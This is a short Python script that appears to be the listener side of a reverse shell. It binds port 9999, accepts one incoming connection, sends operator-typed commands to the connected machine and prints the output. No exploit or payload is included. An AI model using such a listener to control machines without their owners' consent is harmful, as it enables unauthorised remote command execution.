import os
import subprocess
import socket
import sys

def socket_create():
    try:
        global host
        global port
        global s
        host=''
        port=9999
        s=socket.socket()
    except socket.error as err:
        print("Error in creating socket: "+str(err))

def socket_bind():
    try:
        print("Connecting to port: "+str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as err:
        print("Error in binding")

def socket_accept():
    conn, address=s.accept()
    conn.setblocking(1)
    print("Details of client being connected is: IP | "+address[0]+"  Port: "+str(address[1]))
    send_commands(conn)
    conn.close()

def send_commands(conn):
    while True:
        command = input('')
        if command == 'quit':
            conn.send(str.encode('quit'))
            conn.close()
            s.close()
            sys.exit()
        if len(command) > 0:
            conn.send(str.encode(command))
            client_recieve = str(conn.recv(2048), "utf-8")
            print(client_recieve, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()

main()


